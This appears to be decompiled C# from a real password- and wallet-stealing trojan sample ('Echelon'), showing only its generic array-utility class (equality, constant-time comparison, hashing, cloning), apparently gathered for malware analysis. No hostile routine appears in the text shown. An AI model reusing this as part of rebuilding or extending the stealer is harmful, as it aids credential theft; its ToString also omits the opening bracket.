// Decompiled with JetBrains decompiler
// Type: Echelon.Arrays
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Text;

namespace Echelon
{
  public sealed class Arrays
  {
    private Arrays()
    {
    }

    public static bool AreEqual(bool[] a, bool[] b)
    {
      if (a == b)
        return true;
      return a != null && b != null && Arrays.HaveSameContents(a, b);
    }

    public static bool AreEqual(char[] a, char[] b)
    {
      if (a == b)
        return true;
      return a != null && b != null && Arrays.HaveSameContents(a, b);
    }

    public static bool AreEqual(byte[] a, byte[] b)
    {
      if (a == b)
        return true;
      return a != null && b != null && Arrays.HaveSameContents(a, b);
    }

    [Obsolete("Use 'AreEqual' method instead")]
    public static bool AreSame(byte[] a, byte[] b) => Arrays.AreEqual(a, b);

    public static bool ConstantTimeAreEqual(byte[] a, byte[] b)
    {
      int length = a.Length;
      if (length != b.Length)
        return false;
      int num = 0;
      while (length != 0)
      {
        --length;
        num |= (int) a[length] ^ (int) b[length];
      }
      return num == 0;
    }

    public static bool AreEqual(int[] a, int[] b)
    {
      if (a == b)
        return true;
      return a != null && b != null && Arrays.HaveSameContents(a, b);
    }

    private static bool HaveSameContents(bool[] a, bool[] b)
    {
      int length = a.Length;
      if (length != b.Length)
        return false;
      while (length != 0)
      {
        --length;
        if (a[length] != b[length])
          return false;
      }
      return true;
    }

    private static bool HaveSameContents(char[] a, char[] b)
    {
      int length = a.Length;
      if (length != b.Length)
        return false;
      while (length != 0)
      {
        --length;
        if ((int) a[length] != (int) b[length])
          return false;
      }
      return true;
    }

    private static bool HaveSameContents(byte[] a, byte[] b)
    {
      int length = a.Length;
      if (length != b.Length)
        return false;
      while (length != 0)
      {
        --length;
        if ((int) a[length] != (int) b[length])
          return false;
      }
      return true;
    }

    private static bool HaveSameContents(int[] a, int[] b)
    {
      int length = a.Length;
      if (length != b.Length)
        return false;
      while (length != 0)
      {
        --length;
        if (a[length] != b[length])
          return false;
      }
      return true;
    }

    public static string ToString(object[] a)
    {
      StringBuilder stringBuilder = new StringBuilder(91);
      if (a.Length != 0)
      {
        stringBuilder.Append(a[0]);
        for (int index = 1; index < a.Length; ++index)
          stringBuilder.Append(", ").Append(a[index]);
      }
      stringBuilder.Append(']');
      return stringBuilder.ToString();
    }

    public static int GetHashCode(byte[] data)
    {
      if (data == null)
        return 0;
      int length = data.Length;
      int hashCode = length + 1;
      while (--length >= 0)
        hashCode = hashCode * 257 ^ (int) data[length];
      return hashCode;
    }

    public static byte[] Clone(byte[] data) => data != null ? (byte[]) data.Clone() : (byte[]) null;

    public static int[] Clone(int[] data) => data != null ? (int[]) data.Clone() : (int[]) null;
  }
}
